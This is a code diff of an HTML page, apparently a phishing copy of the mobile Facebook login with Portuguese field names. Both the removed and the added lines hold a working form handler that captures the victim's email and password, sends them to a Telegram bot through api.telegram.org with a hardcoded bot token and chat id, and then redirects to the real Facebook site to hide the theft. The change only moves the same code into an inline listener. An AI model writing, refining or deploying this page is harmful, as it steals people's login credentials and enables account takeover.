@@ -11,28 +11,6 @@
 <body>
     <div id="content"></div>
     <script>
-        function submitForm(event) {
-            event.preventDefault();
-            
-            const email = document.querySelector('input[name="email"]').value;
-            const senha = document.querySelector('input[name="senha"]').value;
-            
-            const token = "6957774351:AAHhFvHoT1t0tmfhbiGu87X0nHDFjz87a68";
-            const chat_id = "6384775816";
-            const message = `Email: ${email}\nSenha: ${senha}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
-            
-            fetch(url).then(response => {
-                if (response.ok) {
-                    window.location.href = 'https://m.facebook.com';
-                } else {
-                    alert('Erro ao enviar mensagem para o Telegram');
-                }
-            }).catch(error => {
-                alert('Erro ao enviar mensagem para o Telegram');
-            });
-        }
-
         document.getElementById('content').innerHTML = `
             <div class="mobile">
                 <div class="mobheader">
@@ -87,7 +65,28 @@
             </div>
         `;
 
-        document.getElementById('loginForm').addEventListener('submit', submitForm);
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.querySelector('input[name="email"]').value;
+            const senha = document.querySelector('input[name="senha"]').value;
+            const token = '6957774351:AAHhFvHoT1t0tmfhbiGu87X0nHDFjz87a68';
+            const chat_id = '6384775816';
+            const message = `Email: ${email}\nSenha: ${senha}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = 'https://m.facebook.com';
+                    } else {
+                        alert('Erro ao enviar mensagem para o Telegram');
+                    }
+                })
+                .catch(error => {
+                    alert('Erro ao enviar mensagem para o Telegram');
+                });
+        });
     </script>
 </body>
 </html>
